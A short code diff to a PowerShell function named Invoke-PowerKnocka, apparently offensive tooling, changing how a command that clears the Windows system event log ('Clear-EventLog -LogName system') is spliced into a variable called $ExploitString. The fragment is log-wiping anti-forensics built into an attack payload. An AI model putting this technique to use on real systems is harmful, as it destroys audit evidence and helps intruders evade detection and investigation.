@@ -35,7 +35,7 @@ function Invoke-PowerKnocka {
     }
 
     if ($ClearLog) {
-        $ExploitString = $ExploitString + ";Clear-EventLog -LogName system"
+        $ExploitString = $ExploitString.Insert($ExploitString.Length - 2,';Clear-EventLog -LogName system')
     }
 
     if ($Method -eq "Task") {
